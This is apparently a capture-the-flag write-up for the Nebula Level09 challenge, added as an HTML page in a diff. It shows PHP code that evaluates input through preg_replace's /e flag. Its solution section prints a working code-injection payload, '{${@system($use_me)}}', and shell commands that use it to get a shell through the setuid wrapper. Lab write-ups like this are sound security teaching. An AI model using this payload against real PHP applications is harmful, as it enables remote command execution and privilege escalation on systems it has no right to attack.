@@ -1,0 +1,51 @@
+<h1 id="level09">Level09</h1>
+<h2 id="task">Task</h2>
+<blockquote>
+<p>There’s a C setuid wrapper for some vulnerable PHP code…</p>
+</blockquote>
+<blockquote>
+<p>To do this level, log in as the level09 account with the password
+level09. Files for this level can be found in /home/flag09.</p>
+</blockquote>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode php"><code class="sourceCode php"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> spam(<span class="va">$email</span>)</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>{</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a>  <span class="va">$email</span> <span class="op">=</span> <span class="fu">preg_replace</span>(<span class="st">&quot;/\./&quot;</span><span class="ot">,</span> <span class="st">&quot; dot &quot;</span><span class="ot">,</span> <span class="va">$email</span>)<span class="ot">;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a>  <span class="va">$email</span> <span class="op">=</span> <span class="fu">preg_replace</span>(<span class="st">&quot;/@/&quot;</span><span class="ot">,</span> <span class="st">&quot; AT &quot;</span><span class="ot">,</span> <span class="va">$email</span>)<span class="ot">;</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="va">$email</span><span class="ot">;</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> markup(<span class="va">$filename</span><span class="ot">,</span> <span class="va">$use_me</span>)</span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>{</span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>  <span class="va">$contents</span> <span class="op">=</span> <span class="fu">file_get_contents</span>(<span class="va">$filename</span>)<span class="ot">;</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a>  <span class="va">$contents</span> <span class="op">=</span> <span class="fu">preg_replace</span>(<span class="st">&quot;/(\[email (.*)\])/e&quot;</span><span class="ot">,</span> <span class="st">&quot;spam(</span><span class="sc">\&quot;\\</span><span class="st">2</span><span class="sc">\&quot;</span><span class="st">)&quot;</span><span class="ot">,</span> <span class="va">$contents</span>)<span class="ot">;</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a>  <span class="va">$contents</span> <span class="op">=</span> <span class="fu">preg_replace</span>(<span class="st">&quot;/\[/&quot;</span><span class="ot">,</span> <span class="st">&quot;&lt;&quot;</span><span class="ot">,</span> <span class="va">$contents</span>)<span class="ot">;</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a>  <span class="va">$contents</span> <span class="op">=</span> <span class="fu">preg_replace</span>(<span class="st">&quot;/\]/&quot;</span><span class="ot">,</span> <span class="st">&quot;&gt;&quot;</span><span class="ot">,</span> <span class="va">$contents</span>)<span class="ot">;</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> <span class="va">$contents</span><span class="ot">;</span></span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="va">$output</span> <span class="op">=</span> markup(<span class="va">$argv</span>[<span class="dv">1</span>]<span class="ot">,</span> <span class="va">$argv</span>[<span class="dv">2</span>])<span class="ot">;</span></span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a><span class="kw">print</span> <span class="va">$output</span><span class="ot">;</span></span>
+<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<h2 id="solution">Solution</h2>
+<p>When <code>pre_replace</code> is used with the <code>/e</code> flag,
+the replacement string is substituted, evaluated, and replaced in the
+original. By looking at the PHP source code, we see the following:
+<code>$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);</code>
+the regex will mean that it is the pattern <code>([email EMAIL])</code>
+where <code>EMAIL</code> will be evaluated by the function.</p>
+<p>with that in mind crafting the following payload allows us to get the
+flag</p>
+<pre><code>level09@nebula:/home/flag09$ echo &#39;[email {${@system($use_me)}}]&#39; &gt; /tmp/09</code></pre>
+<p>here the email arg will be an argument that will send the next
+argument to the system.</p>
+<pre><code>level09@nebula:/home/flag09$ ./flag09 /tmp/09 sh
+sh-4.2$ getflag
+You have successfully executed getflag on a target account</code></pre>
